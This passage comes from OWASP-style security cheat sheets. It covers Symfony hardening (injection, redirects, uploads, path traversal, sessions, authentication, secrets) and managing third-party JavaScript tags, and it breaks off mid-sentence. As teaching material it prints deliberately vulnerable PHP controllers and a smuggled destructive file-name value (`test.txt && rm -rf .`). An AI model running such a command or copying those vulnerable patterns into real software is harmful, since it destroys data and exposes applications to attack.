...\r\n    }\r\n}\r\n\r\n```\r\n\r\nExamples bellow shows the **correct ways** that provides protection against SQL Injection:\r\n\r\n- Using entity repository built-in method\r\n\r\n```php\r\n$id = $request->query->get('id');\r\n$post = $em->getRepository(Post::class)->findOneBy(['id' => $id]);\r\n```\r\n\r\n- Using Doctrine DQL Language\r\n\r\n```php\r\n$query = $em->createQuery(\"SELECT p FROM App\\Entity\\Post p WHERE p.id = :id\");\r\n$query->setParameter('id', $id);\r\n$post = $query->getSingleResult();\r\n```\r\n\r\n- Using DBAL Query Builder\r\n\r\n```php\r\n$qb = $em->createQueryBuilder();\r\n$post = $qb->select('p')\r\n            ->from('posts','p')\r\n            ->where('id = :id')\r\n            ->setParameter('id', $id)\r\n            ->getQuery()\r\n            ->getSingleResult();\r\n```\r\n\r\nFor more information about Doctrine you can refer to [their documentation](https://www.doctrine-project.org/index.html).\r\nYou may also refer the [SQL Injection Prevention Cheatsheet](SQL_Injection_Prevention_Cheat_Sheet.md) for more information that is not specific to neither Symfony nor Doctrine.\r\n\r\n### Command Injection\r\n\r\nCommand Injection occurs when malicious code is injected into an application system and executed.\r\nFor more information refer to [Command Injection Defense Cheat Sheet](OS_Command_Injection_Defense_Cheat_Sheet.md).\r\n\r\nConsider the following example, where file is removed using the exec() function without any input escaping:\r\n\r\n```php\r\nuse Symfony\\Component\\HttpFoundation\\Request;\r\nuse Symfony\\Component\\HttpFoundation\\Response;\r\nuse Symfony\\Component\\HttpKernel\\Attribute\\AsController;\r\nuse Symfony\\Component\\Routing\\Annotation\\Route;\r\n\r\n#[AsController]\r\nclass ExampleController \r\n{\r\n\r\n    #[Route('/remove_file', methods: ['POST'])]\r\n    public function removeFile(Request $request): Response\r\n    {\r\n        $filename =  $request->request->get('filename');\r\n        exec(sprintf('rm %s', $filename));\r\n\r\n        // ...\r\n    }\r\n}\r\n```\r\n\r\nIn the above code, there is no any validation of user's input. Imagine what could happen if user provides a malicious value like `test.txt && rm -rf .` . To mitigate this risk, it is advisable to use native PHP functions like in this case `unlink()` or Symfony Filesystem Component `remove()` method instead of `exec()`.\r\n\r\nFor specific PHP filesystem functions relevant to your case, you can refer to the [PHP documentation](https://www.php.net/manual/en/refs.fileprocess.file.php) or [Symfony Filesystem Component documentation](https://symfony.com/doc/current/components/filesystem.html).\r\n\r\n### Open Redirection\r\n\r\nOpen Redirection is a security flaw that occurs when a web application redirects users to a URL specified in an invalidated parameter. Attackers exploit this vulnerability to redirect users to malicious sites.\r\n\r\nIn the provided PHP code snippet:\r\n\r\n```php\r\nuse Symfony\\Bundle\\FrameworkBundle\\Controller\\AbstractController;\r\nuse Symfony\\Component\\HttpFoundation\\Request;\r\nuse Symfony\\Component\\HttpFoundation\\Response;\r\nuse Symfony\\Component\\HttpKernel\\Attribute\\MapQueryParameter;\r\nuse Symfony\\Component\\Routing\\Annotation\\Route;\r\n\r\nclass ExampleController extends AbstractController \r\n{\r\n\r\n    #[Route('/dynamic_redirect', methods: ['GET'])]\r\n    public function dynamicRedirect(#[MapQueryParameter] string $url): Response \r\n    {\r\n        return $this->redirect($url);\r\n    }\r\n}\r\n```\r\n\r\nThe controller function redirects users based on the `url` query parameter without proper validation. Attackers can craft malicious URLs, leading unsuspecting users to malicious sites. To prevent open redirection, always validate and sanitize user input before redirection, and avoid using untrusted input directly in redirect functions.\r\n\r\n### File Upload Vulnerabilities\r\n\r\nFile upload vulnerabilities are security issues that arise when an application does not properly validate and handle file uploads. It's important to ensure that file uploads are handled securely to prevent various types of attacks. Here are some general guidelines to help mitigate this issue in Symfony:\r\n\r\n#### Validate file type and size\r\n\r\nAlways validate the file type on the server side to ensure that only allowed file types are accepted.\r\nAlso consider limiting the size of uploaded files to prevent denial-of-service attacks and to ensure that your server has enough resources to handle the uploads.\r\n\r\nExample with PHP Attributes:\r\n\r\n```php\r\nuse Symfony\\Component\\HttpFoundation\\File\\UploadedFile;\r\nuse Symfony\\Component\\Validator\\Constraints\\File;\r\n\r\nclass UploadDto\r\n{\r\n    public function __construct(\r\n        #[File(\r\n            maxSize: '1024k',\r\n            mimeTypes: [\r\n                'application/pdf',\r\n                'application/x-pdf',\r\n            ],\r\n        )]\r\n        public readonly UploadedFile $file,\r\n    ){}\r\n}\r\n```\r\n\r\nExample with Symfony Form:\r\n\r\n```php\r\nuse Symfony\\Component\\Form\\AbstractType;\r\nuse Symfony\\Component\\Form\\Extension\\Core\\Type\\FileType;\r\nuse Symfony\\Component\\Form\\FormBuilderInterface;\r\nuse Symfony\\Component\\Validator\\Constraints\\File;\r\n\r\nclass FileForm extends AbstractType\r\n{\r\n    public function buildForm(FormBuilderInterface $builder, array $options)\r\n    {\r\n        $builder\r\n            ->add('file', FileType::class, [\r\n                'constraints' => [\r\n                    new File([\r\n                        'maxSize' => '1024k', \r\n                        'mimeTypes' => [\r\n                            'application/pdf',\r\n                            'application/x-pdf',\r\n                        ],\r\n                    ]),\r\n                ],\r\n            ]);\r\n    }\r\n}\r\n```\r\n\r\n#### Use unique filenames\r\n\r\nEnsure that each uploaded file has a unique name to prevent overwriting existing files. You can use a combination of a unique identifier and the original filename to generate a unique name.\r\n\r\n#### Store uploaded files securely\r\n\r\nStore uploaded files outside the public directory to prevent direct access. If you use public directory to store them, configure your web server to deny access to the upload directory.\r\n\r\nRefer the [File Upload Cheatsheet](File_Upload_Cheat_Sheet.md) to learn more.\r\n\r\n### Directory Traversal\r\n\r\nA directory or path traversal attack aims to access files and directories that are stored on server by manipulating input data that reference files with “../” *dot-dot-slash* sequences and its variations or by using absolute file paths.\r\nFor more details refer to [OWASP Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal).\r\n\r\nYou can protect your application before directory traversal attack by validating whether the absolute path of requested file location is correct or strip out directory information from filename input.\r\n\r\n- Check if path exists using PHP *realpath* function and that it leads to the storage directory\r\n\r\n```php\r\nuse Symfony\\Bundle\\FrameworkBundle\\Controller\\AbstractController;\r\nuse Symfony\\Component\\HttpFoundation\\Response;\r\nuse Symfony\\Component\\HttpKernel\\Attribute\\MapQueryParameter;\r\nuse Symfony\\Component\\Routing\\Annotation\\Route;\r\n\r\nclass ExampleController extends AbstractController \r\n{\r\n\r\n    #[Route('/download', methods: ['GET'])]\r\n    public function download(#[MapQueryParameter] string $filename): Response \r\n    {\r\n        $storagePath = $this->getParameter('kernel.project_dir') . '/storage';\r\n        $filePath = $storagePath . '/' . $filename;\r\n\r\n        $realBase = realpath($storagePath);\r\n        $realPath = realpath($filePath);\r\n\r\n        if ($realPath === false || !str_starts_with($realPath, $realBase))\r\n        {\r\n            //Directory Traversal!\r\n        }\r\n\r\n        // ...\r\n\r\n    }\r\n}\r\n```\r\n\r\n- Strip out directory information with PHP *basename* function\r\n\r\n```php\r\n// ...\r\n\r\n$storagePath = $this->getParameter('kernel.project_dir') . '/storage';\r\n$filePath = $storagePath . '/' . basename($filename);\r\n\r\n// ...\r\n```\r\n\r\n### Dependencies vulnerabilities\r\n\r\nDependency vulnerabilities can expose your application to various risks, making it crucial to adopt best practices.\r\nKeep all Symfony components and third-party libraries up-to-date.\r\n\r\nComposer, the dependency manager for PHP makes it easy to update PHP packages:\r\n\r\n```bash\r\ncomposer update\r\n```\r\n\r\nWhen using multiple dependencies, some of them may contain security vulnerabilities.\r\nTo address this concern, Symfony comes with [Symfony Security Checker](https://symfony.com/doc/current/setup.html#checking-security-vulnerabilities). This tool specifically examines the *composer.lock* file in your project to identify any known security vulnerabilities within the dependencies that have been installed and address any potential security issues in your Symfony project.\r\n\r\nTo use Security Checker run following command using [Symfony CLI](https://github.com/symfony-cli/symfony-cli):\r\n\r\n```bash\r\nsymfony check:security\r\n```\r\n\r\nYou should also consider similar tools:\r\n\r\n- [Local PHP Security Checker](https://github.com/fabpot/local-php-security-checker)\r\n\r\n- [Enlightn Security Checker](https://github.com/enlightn/security-checker)\r\n\r\n### Cross Origin Resource Sharing\r\n\r\nCORS is a security feature implemented in web browsers to control how web applications in one domain can request and interact with resources hosted on another domains.\r\n\r\nIn Symfony you can manage CORS policies using `nemilo/cors-bundle`. This bundle lets you control CORS rules precisely without changing your server settings.\r\n\r\nTo install it with composer, run:\r\n\r\n```bash\r\ncomposer require nelmio/cors-bundle\r\n```\r\n\r\nFor Symfony Flex users, the installation generates a basic configuration file in the `config/packages` directory automatically. Take a look at the example configuration for routes starting with */API* prefix.\r\n\r\n```yaml\r\n# config/packages/nelimo_cors.yaml\r\nnelmio_cors:\r\n    defaults:\r\n        origin_regex: true\r\n        allow_origin: ['*']\r\n        allow_methods: ['GET', 'OPTIONS', 'POST', 'PUT', 'PATCH', 'DELETE']\r\n        allow_headers: ['*']\r\n        expose_headers: ['Link']\r\n        max_age: 3600\r\n    paths:\r\n        '^/api': ~  # ~ means that configurations for this path is inherited from defaults\r\n```\r\n\r\n### Security-related Headers\r\n\r\nIt's advisable to enhance the security of your Symfony application by adding to your responses essential security headers as:\r\n\r\n- Strict-Transport-Security\r\n- X-Frame-Options\r\n- X-Content-Type-Options\r\n- Content-Security-Policy\r\n- X-Permitted-Cross-Domain-Policies\r\n- Referrer-Policy\r\n- Clear-Site-Data\r\n- Cross-Origin-Embedder-Policy\r\n- Cross-Origin-Opener-Policy\r\n- Cross-Origin-Resource-Policy\r\n- Cache-Control\r\n\r\nTo find more details about individual header refer to [OWASP secure headers project](https://owasp.org/www-project-secure-headers/).\r\n\r\nIn Symfony you can add those headers either manually or automatically by listening the [ResponseEvent](https://symfony.com/doc/current/reference/events.html#kernel-response) to your to every response or configuring web servers like Nginx or Apache.\r\n\r\n```php\r\nuse Symfony\\Component\\HttpFoundation\\Request;\r\n\r\n$response = new Response();\r\n$response->headers->set('X-Frame-Options', 'SAMEORIGIN');\r\n```\r\n\r\n### Session & Cookies Management\r\n\r\nBy default sessions are securely configured and enabled. However, they can be controlled manually in `config/packages/framework.yaml` under the `framework.session` key. Make sure to set the following in your session configuration to make your application more aware.\r\n\r\nEnsure `cookie_secure` is not explicitly set to `false`(it is set to `true` by default). Setting http only to `true` means that cookie won't be accessible by JavaScript.\r\n\r\n```yaml\r\ncookie_httponly: true\r\n```\r\n\r\nMake sure to set a short session TTL duration. According to [OWASP's recommendations](Session_Management_Cheat_Sheet.md), aim for a session TTL of 2-5 minutes for high-value applications and 15-30 minutes for lower-risk applications.\r\n\r\n```yaml\r\ncookie_lifetime: 5\r\n```\r\n\r\nIt is recommended to set `cookie_samesite` to either `lax` or `strict` to prevent cookies being send from cross-origin requests. `lax` allows the cookie to be sent along with \"safe\" top-level navigations and same-site requests. With `strict`  it would not be possible to send any cookie when the HTTP request is not from the same domain.\r\n\r\n```yaml\r\ncookie_samesite: lax|strict\r\n```\r\n\r\nSetting `cookie_secure` to `auto` assures us that cookies are only sent over secure connections, meaning `true` for HTTPS and `false` for HTTP protocol.\r\n\r\n```yaml\r\ncookie_secure: auto\r\n```\r\n\r\nOWASP provides more general information about sessions in [Session Management Cheat Sheet](Session_Management_Cheat_Sheet.md).\r\nYou may also refer the [Cookie Security Guide](https://owasp.org/www-chapter-london/assets/slides/OWASPLondon20171130_Cookie_Security_Myths_Misconceptions_David_Johansson.pdf).\r\n\r\n---\r\nIn Symfony, sessions are managed by the framework itself and rely on Symfony's session handling mechanisms rather than PHP's default session handling via the `session.auto_start = 1` directive in the php.ini file.\r\nThe `session.auto_start = 1` directive in PHP is used to automatically start a session on each request, bypassing explicit calls to `session_start()`. However, when using Symfony for session management, it's recommended to disable `session.auto_start` to prevent conflicts and unexpected behavior.\r\n\r\n### Authentication\r\n\r\n[Symfony Security](https://symfony.com/doc/current/security.html) provides a robust authentication system that includes providers, firewalls, and access controls to ensure a secure and controlled access environment. Authentication settings can be configured in `config/packages/security.yaml`.\r\n\r\n- **Providers**\r\n\r\n    Symfony authentication relies on providers to fetch user information from various storages such as databases, LDAP, or custom sources. Providers get users based on the defined propety and load the corresponding user object.\r\n\r\n    In below example [Entity User Provider](https://symfony.com/doc/current/security/user_providers.html#security-entity-user-provider) is presented which uses Doctrine to fetch user by unique identifier.\r\n\r\n    ```yaml\r\n    providers:\r\n        app_user_provider:\r\n            entity:\r\n                class: App\\Entity\\User\r\n                property: email\r\n    ```\r\n\r\n- **Firewalls**\r\n\r\n    Symfony use firewalls to define security configurations for different parts of an application. Each firewall define a specific set of rules and actions for incoming requests. They protect different sections of the application by specifying which routes or URLs are secured, the authentication mechanisms to use, and how to handle unauthorized access. A firewall can be associated with specific patterns, request methods, access controls, and authentication providers.\r\n\r\n    ```yaml\r\n    firewalls:\r\n        dev: # disable security on routes used in development env\r\n            pattern: ^/(_(profiler|wdt)|css|images|js)/\r\n            security: false\r\n        admin: # handle authentication in /admin pattern routes\r\n            lazy: true\r\n            provider: app_user_provider\r\n            pattern: ^/admin\r\n            custom_authenticator: App\\Security\\AdminAuthenticator\r\n            logout:\r\n                path: app_logout\r\n                target: app_login\r\n        main: # main firewall that include all remaining routes\r\n            lazy: true\r\n            provider: app_user_provider\r\n    ```\r\n\r\n- **Access Control**\r\n\r\n    Access control determines which users can access specific parts of an application. These rules consist of path patterns and required roles or permissions. Access control rules are configured under `access_control` key.\r\n\r\n    ```yaml\r\n    access_control:\r\n        - { path: ^/admin, roles: ROLE_ADMIN } # only user with ROLE_ADMIN role is allowed\r\n        - { path: ^/login, roles: PUBLIC_ACCESS } # everyone can access this route\r\n    ```\r\n\r\n### Error Handling Disclosure\r\n\r\nSymfony has a robust error handling system. By default, Symfony applications are configured to display detailed error messages only in the development environment for security reasons. In the production environment, a generic error page is shown. Symfony's error handling system also allows to customize error pages based on different HTTP status codes, providing a seamless and branded user experience. Additionally, Symfony logs detailed error information, aiding developers in identifying and resolving issues efficiently.\r\n\r\nFor more information about error handling unrelated to Symfony refer to [Error Handling Cheat Sheet](Error_Handling_Cheat_Sheet.md).\r\n\r\n### Sensitive data\r\n\r\nIn Symfony the best way for storing configurations like API keys, etc., is through the use of environment variable, which are dependent on the application's location.\r\nTo ensure the security of sensitive values, Symfony provides a *secrets management system* in which values are additionally encoded using cryptographic keys and stored as **secrets**.\r\n\r\nConsider an example where an API_KEY is stored as secret:\r\n\r\nTo generate a pair of cryptographic keys you can run the following command. The private key file is highly sensitive and it shouldn't be committed in repository.\r\n\r\n```bash\r\nbin/console secrets:generate-keys\r\n```\r\n\r\nThis command will generate a file for the API_KEY secret in `config/secrets/env(dev|prod|etc.)`\r\n\r\n```bash\r\nbin/console secret:set API_KEY\r\n```\r\n\r\nYou can access secret values in your code in the same manner as environment variables.\r\nIt's very important to note that if there are environment variables and secrets with identical names, **the values from environment variables will always will override secrets**.\r\n\r\nFor more details refer to [Symfony Secrets Documentation](https://symfony.com/doc/current/configuration/secrets.html).\r\n\r\n### Summary\r\n\r\n- Make sure your app is not in debug mode while in production. To turn off debug mode, set your `APP_ENV` environment variable to `prod`:\r\n\r\n    ```ini\r\n    APP_ENV=prod\r\n    ```\r\n\r\n- Make sure your PHP configuration is secure. You may refer the [PHP Configuration Cheat Sheet](PHP_Configuration_Cheat_Sheet.md) for more information on secure PHP configuration settings.\r\n\r\n- Ensure that the SSL certificate is properly configured in your web server and configure it to enforce HTTPS by redirecting HTTP traffic to HTTPS.\r\n\r\n- Implement security headers to enhance the security posture of your application.\r\n\r\n- Ensure that file and directory permissions are set correctly to minimize security risks.\r\n\r\n- Implement regular backups of your production database and critical files. Have a recovery plan in place to quickly restore your application in case of any issue.\r\n\r\n- Use security checkers to scan your dependencies to identify known vulnerabilities.\r\n\r\n- Consider setting up monitoring tools and error reporting mechanisms to quickly identify and address issues in your production environment. Explore tools like [Blackfire.io](https://www.blackfire.io).\r\n\r\n## References\r\n\r\n- [Symfony CSRF Documentation](https://symfony.com/doc/current/security/csrf.html)\r\n- [Symfony Twig Documentation](https://symfony.com/doc/current/templates.html)\r\n- [Symfony Validation Documentation](https://symfony.com/doc/current/validation.html)\r\n- [Symfony Blackfire Documentation](https://symfony.com/doc/current/the-fast-track/en/29-performance.html)\r\n- [Doctrine Security Documentation](https://www.doctrine-project.org/projects/doctrine-dbal/en/3.7/reference/security.html)\r\n"
    },
    {
      "Third_Party_Javascript_Management_Cheat_Sheet.md": "# Third Party JavaScript Management Cheat Sheet\r\n\r\n## Introduction\r\n\r\nTags, aka marketing tags, analytics tags etc. are small bits of JavaScript on a web page. They can also be HTML image elements when JavaScript is disabled. The reason for them is to collect data on the web user actions and browsing context for use by the web page owner in marketing.\r\n\r\nThird party vendor JavaScript tags (hereinafter, **tags**) can be divided into two types:\r\n\r\n- User interface tags.\r\n- Analytic tags.\r\n\r\nUser interface tags have to execute on the client because they change the DOM; displaying a dialog or image or changing text etc.\r\n\r\nAnalytics tags send information back to a marketing information database; information like what user action was just taken, browser metadata, location information, page metadata etc. The rationale for analytics tags is to provide data from the user's browser DOM to the vendor for some form of marketing analysis. This data can be anything available in the DOM. The data is used for user navigation and clickstream analysis, identification of the user to determine further content to display etc., and various marketing analysis functions.\r\n\r\nThe term **host** refers to the original site the user goes to, such as a shopping or news site, that contains or retrieves and executes third party JavaScript tag for marketing analysis of the user actions.\r\n\r\n## Major risks\r\n\r\nThe single greatest risk is a compromise of the third party JavaScript server, and the injection of malicious JavaScript into the original tag JavaScript. This has happened in 2018 and likely earlier.\r\n\r\nThe invocation of third-party JS code in a web application requires consideration for 3 risks in particular:\r\n\r\n1. The loss of control over changes to the client application,\r\n2. The execution of arbitrary code on client systems,\r\n3. The disclosure or leakage of sensitive information to 3rd parties.\r\n\r\n### Risk 1: Loss of control over changes to the client application\r\n\r\nThis risk arises from the fact that there is usually no guaranty that the code hosted at the third-party will remain the same as seen from the developers and testers: new features may be pushed in the third-party code at any time, thus potentially breaking the interface or data-flows and exposing the availability of your application to its users/customers.\r\n\r\nTypical defenses include, but are not restricted to: in-house script mirroring (to prevent alterations by 3rd parties), sub-resource integrity (to enable browser-level interception) and secure transmission of the third-party code (to prevent modifications while in-transit). See below for more details.\r\n\r\n### Risk 2: Execution of arbitrary code on client systems\r\n\r\nThis risk arises from the fact that third-party JavaScript code is rarely reviewed by the invoking party prior to its integration into a website/application. As the client reaches the hosting website/application, this third-party code gets executed, thus granting the third-party the exact same privileges that were granted to the user (similar to [XSS attacks](https://owasp.org/www-community/attacks/xss/)).\r\n\r\nAny testing performed prior to entering production loses some of its validity, including `AST testing` ([IAST](https://www.veracode.com/security/interactive-application-security-testing-iast), [RAST](https://www.veracode.com/sites/default/files/pdf/resources/whitepapers/what-is-rasp.pdf), [SAST](https://www.sqreen.com/web-application-security/what-is-sast), [DAST](https://www.sqreen.com/web-application-security/what-is-dast), etc.).\r\n\r\nWhile it is widely accepted that the probability of having rogue code intentionally injected by the third-party is low, there are still cases of malicious injections in third-party code after the organization's servers were compromised (ex: Yahoo, January 2014).\r\n\r\nThis risk should therefore still be evaluated, in particular when the third-party does not show any documentation that it is enforcing better security measures than the invoking organization itself, or at least equivalent. Another example is that the domain hosting the third-party JavaScript code expires because the company maintaining it is bankrupt or the developers have abandoned the project. A malicious actor can then re-register the domain and publish malicious code.\r\n\r\nTypical defenses include, but are not restricted to:\r\n\r\n- In-house script mirroring (to prevent alterations by 3rd parties),\r\n- [Sub-resource integrity](https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity) (to enable browser-level interception),\r\n- Secure transmission of the third-party code (to prevent modifications while in-transit) and various types of sandboxing. See below for more details.\r\n- ...\r\n\r\n### Risk 3: Disclosure of sensitive information to 3rd parties\r\n\r\nWhen a third-party script is invoked in a website/application, the browser directly contacts the third-party servers. By default, the request includes all regular HTTP headers. In addition to the originating IP address of the browser, the third-party also obtains other data such as the referrer (in non-https requests) and any cookies previously set by the 3rd party, for example when visiting another organization's website that also invokes the third-party script.\r\n\r\nIn many cases, this grants the third-party primary access to information on the organization's users / customers / clients. Additionally, if the third-party is sharing the script with other entities, it also collects secondary data from all the other entities, thus knowing who the organization's visitors are but also what other organizations they interact with.\r\n\r\nA typical case is the current situation with major news/press sites that invoke third-party code (typically for ad engines, statistics and JavaScript APIs): any user visiting any of these websites also informs the 3rd parties of the visit. In many cases, the third-party also gets to know what news articles each individual user is clicking specifically (leakage occurs through the HTTP referrer field) and thus can establish deeper personality profiles.\r\n\r\nTypical defenses include, but are not restricted to: in-house script mirroring (to prevent leakage of HTTP requests to 3rd parties). Users can reduce their profiling by random clicking links on leaking websites/applications (such as press/news websites) to reduce profiling. See below for more details.\r\n\r\n## Third-party JavaScript Deployment Architectures\r\n\r\nThere are three basic deployment mechanisms for **tags**. These mechanisms can be combined with each other.\r\n\r\n### Vendor JavaScript on page\r\n\r\nThis is where the vendor provides the host with the JavaScript and the host puts it on the host page. To be secure the host company must review the code for any vulnerabilities like [XSS attacks](https://owasp.org/www-community/attacks/xss/) or malicious actions such as sending sensitive data from the DOM to a malicious site. This is often difficult because the JavaScript is commonly obfuscated.\r\n\r\n```html\r\n<!-- Some host, e.g. foobar.com, HTML code here -->\r\n<html>\r\n<head></head>\r\n    <body>\r\n        ...\r\n        <script type=\"text/javascript\">/* 3rd party vendor javascript here */</script>\r\n    </body>\r\n</html>\r\n```\r\n\r\n### JavaScript Request to Vendor\r\n\r\nThis is where one or a few lines of code on the host page each request a JavaScript file or URL directly from the vendor site. When the host page is being created, the developer includes the lines of code provided by the vendor that will request the vendor JavaScript. Each time the page is accessed the requests are made to the vendor site for the javascript, which then executes on the user browser.\r\n\r\n```html\r\n<!-- Some host, e.g. foobar.com, HTML code here -->`\r\n<html>\r\n    <head></head>\r\n    <body>\r\n        ...\r\n        <!-- 3rd party vendor javascript -->\r\n        <script src=\"https://analytics.vendor.com/v1.1/script.js\"></script>\r\n        <!-- /3rd party vendor javascript -->\r\n    </body>\r\n</html>\r\n```\r\n\r\n### Indirect request to Vendor through Tag Manager\r\n\r\nThis is where one or a few lines of code on the host page each request a JavaScript file or URL from a tag aggregator or **tag manager** site; not from the JavaScript vendor site. The tag aggregator or tag manager site returns whatever third party JavaScript files that the host company has configured to be returned. Each file or URL request to the tag manager site can return lots of other JavaScript files from multiple vendors.\r\n\r\nThe actual content that is returned from the aggregator or manager (i.e. the specific JavaScript files as well as exactly what they do) can be dynamically changed by host site employees using a graphical user interface for development, hosted on the tag manager site that non-technical users can work with, such as the marketing part of the business.\r\n\r\nThe changes can be either:\r\n\r\n1. Get a different JavaScript file from the third-party vendor for the same request.\r\n2. Change what DOM object data is read, and when, to send to the vendor.\r\n\r\nThe tag manager developer user interface will generate code that does what the marketing functionality requires, basically determining what data to get from the browser DOM and when to get it. The tag manager always returns a **container** JavaScript file to the browser which is basically a set of JavaScript functions that are used by the code generated by the user interface to implement the required functionality.\r\n\r\nSimilar to java frameworks that provide functions and global data to the developer, the container JavaScript executes on the browser and lets the business user use the tag manager developer user interface to specify high level functionality without needing to know JavaScript.\r\n\r\n```html\r\n<!-- Some host, e.g. foobar.com, HTML code here -->\r\n <html>\r\n   <head></head>\r\n     <body>\r\n       ...\r\n       <!-- Tag Manager -->\r\n       <script>(function(w, d, s, l, i){\r\n         w[l] = w[l] || [];\r\n         w[l].push({'tm.start':new Date().getTime(), event:'tm.js'});\r\n         var f = d.getElementsByTagName(s)[0],\r\n         j = d.createElement(s),\r\n         dl = l != 'dataLayer' ? '&l=' + l : '';\r\n         j.async=true;\r\n         j.src='https://tagmanager.com/tm.js?id=' + i + dl;\r\n         f.parentNode.insertBefore(j, f);\r\n       })(window, document, 'script', 'dataLayer', 'TM-FOOBARID');</script>\r\n       <!-- /Tag Manager -->\r\n   </body>\r\n</html>`\r\n```\r\n\r\n#### Security Problems with requesting Tags\r\n\r\nThe previously described mechanisms are difficult to make secure because you can only see the code if you proxy the requests or if you get access to the GUI and see what is configured. The JavaScript is generally obfuscated so even seeing it is usually not useful. It is also instantly deployable because each new page request from a browser executes the requests to the aggregator which gets the JavaScript from the third party vendor. So as soon as any JavaScript files are changed on the vendor, or modified on the aggregator, the next call for them from any browser will get the changed JavaScript. One way to manage this risk is with the *Subresource Integrity* standard described below.\r\n\r\n### Server Direct Data Layer\r\n\r\nThe tag manager developer user interface can be used to create JavaScript that can get data from anywhere in the browser DOM and store it anywhere on the page. This can allow vulnerabilities because the interface can be used to generate code to get unvalidated data from the DOM (e.g. URL parameters) and store it in some page location that would execute JavaScript.\r\n\r\nThe best way to make the generated code secure is to confine it to getting DOM data from a host defined data layer.\r\n\r\nThe data layer is either:\r\n\r\n1. a DIV object with attribute values that have the marketing or user behavior data that the third-party wants\r\n2. a set of JSON objects with the same data. Each variable or attribute contains the value of some DOM element or the description of a user action. The data layer is the complete set of values that all vendors need for that page. The data layer is created by the host developers.\r\n\r\nWhen specific events happen that the business has defined, a JavaScript handler for that event sends values from the data layer directly to the tag manager server. The tag manager server then sends the data to whatever third party or parties is supposed to get it. The event handler code is created by the host developers using the tag manager developer user interface. The event handler code is loaded from the tag manager servers on every page load.\r\n\r\n**This is a secure technique** because only your JavaScript executes on your users browser, and only the data you decide on is sent to the vendor.\r\n\r\nThis requires cooperation between the host, the aggregator or tag manager and the vendors.\r\n\r\nThe host developers have to work with the vendor in order to know what type of data the vendor needs to do their analysis. Then the host programmer determines what DOM element will have that data.\r\n\r\nThe host developers have to work with the tag manager or aggregator to agree on the protocol to send the data to the aggregator: what URL, parameters, format etc.\r\n\r\nThe tag manager or aggregator has to work with the vendor to agree on the protocol to send the data to the vendor: what URL, parameters, format etc. Does the vendor have an API?\r\n\r\n## Security Defense Considerations\r\n\r\n### Server Direct Data Layer\r\n\r\nThe server direct mechanism is a good security standard for third party JavaScript management, deployment and execution. A good practice for the host page is to create a data layer of DOM objects.\r\n\r\nThe data layer can perform any validation of the values, especially values from DOM objects exposed to the user like URL parameters and input fields, if these are required for the marketing analysis.\r\n\r\nAn example statement for a corporate standard document is 'The tag JavaScript can only access values in the host data layer. The tag JavaScript can never access a URL parameter.\r\n\r\nYou the host page developer have to agree with the third-party vendors or the tag manager what attribute in the data layer will have what value so they can create the JavaScript to read that value.\r\n\r\nUser interface tags cannot be made secure using the data layer architecture because their function (or one of their functions) is to change the user interface on the client, not to send data about the user actions.\r\n\r\nAnalytics tags can be made secure using the data layer architecture because the only action needed is to send data from the data layer to the third party. Only first party code is executed; first to populate the data layer (generally on page load); then event handler JavaScript sends whatever data is needed from that page to the third party database or tag manager.\r\n\r\nThis is also a very scalable solution. Large ecommerce sites can easily have hundreds of thousands of URL and parameter combinations, with different sets of URLs and parameters being included in different marketing analysis campaigns. The marketing logic could have 30 or 40 different vendor tags on a single page.\r\n\r\nFor example user actions in pages about specified cities, from specified locations on specified days should send data layer elements 1, 2 and 3. User actions in pages about other cities should send data layer elements 2 and 3 only. Since the event handler code to send data layer data on each page is controlled by the host developers or marketing technologists using the tag manager developer interface, the business logic about when and what data layer elements are sent to the tag manager server, can be changed and deployed in minutes. No interaction is needed with the third parties; they continue getting the data they expect but now it comes from different contexts that the host marketing technologists have chosen.\r\n\r\nChanging third party vendors just means changing the data dissemination rules at the tag manager server, no changes are needed in the host code. The data also goes directly only to the tag manager so the execution is fast. The event handler JavaScript does not have to connect to multiple third party sites.\r\n\r\n### Indirect Requests\r\n\r\nFor indirect requests to tag manager/aggregator sites that offer the GUI to configure the javascript, they may also implement:\r\n\r\n- Technical controls such as only allowing the JavaScript to access the data layer values, no other DOM element\r\n- Restricting the tag types deployed on a host site, e.g. disabling of custom HTML tags and JavaScript code\r\n\r\nThe host company should also verify the security practices of the tag manager site such as access controls to the tag configuration for the host company. It also can be two-factor authentication.\r\n\r\nLetting the marketing folks decide where to get the data they want can result in XSS because they may get it from a URL parameter and put it into a variable that is in a scriptable location on the page.\r\n\r\n### Sandboxing Content\r\n\r\nBoth of these tools be used by sites to sandbox/clean DOM data.\r\n\r\n- [DOMPurify](https://github.com/cure53/DOMPurify) is a fast, tolerant XSS sanitizer for HTML, MathML and SVG. DOMPurify works with a secure default, but offers a lot of configurability and hooks.\r\n- [MentalJS](https://github.com/hackvertor/MentalJS) is a JavaScript parser and sandbox. It allow-lists JavaScript code by adding a \"$\" suffix to variables and accessors.\r\n\r\n### Subresource Integrity\r\n\r\n[Subresource Integrity](https://www.w3.org/TR/SRI/) will ensure that only the code that has been reviewed is executed. The developer generates integrity metadata for the vendor javascript, and adds it to the script element like this:\r\n\r\n```javascript\r\n<script src=\"https://analytics.vendor.com/v1.1/script.js\"\r\n   integrity=\"sha384-MBO5IDfYaE6c6Aao94oZrIOiC7CGiSNE64QUbHNPhzk8Xhm0djE6QqTpL0HzTUxk\"\r\n   crossorigin=\"anonymous\">\r\n</script>\r\n```\r\n\r\nIt is important to know that in order for SRI to work, the vendor host needs [CORS](https://www.w3.org/TR/cors/) enabled. Also it is good idea to monitor vendor JavaScript for changes in regular way. Because sometimes you can get **secure** but **not working** third-party code when the vendor decides to update it.\r\n\r\n### Keeping JavaScript libraries updated\r\n\r\n[OWASP Top 10 2013 A9](https://wiki.owasp.org/index.php/Top_10_2013-A9-Using_Components_with_Known_Vulnerabilities) describes the problem of using components with known vulnerabilities. This includes JavaScript libraries. JavaScript libraries must be kept up to date, as previous version can have known vulnerabilities which can lead to the site typically being vulnerable to [Cross Site Scripting](https://owasp.org/www-community/attacks/xss/). There are several tools out there that can help identify such libraries. One such tool is the free open source tool [RetireJS](https://retirejs.github.io)\r\n\r\n### Sandboxing with iframe\r\n\r\nYou can also put vendor JavaScript into an iframe from different domain (e.g. static data host). It will work as a \"jail\" and vendor JavaScript will not have direct access to the host page DOM and cookies.\r\n\r\nThe host main page and sandbox iframe can communicate between each other via the [postMessage mechanism](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage).\r\n\r\nAlso, iframes can be secured with the iframe [sandbox attribute](http://www.html5rocks.com/en/tutorials/security/sandboxed-iframes/).\r\n\r\nFor 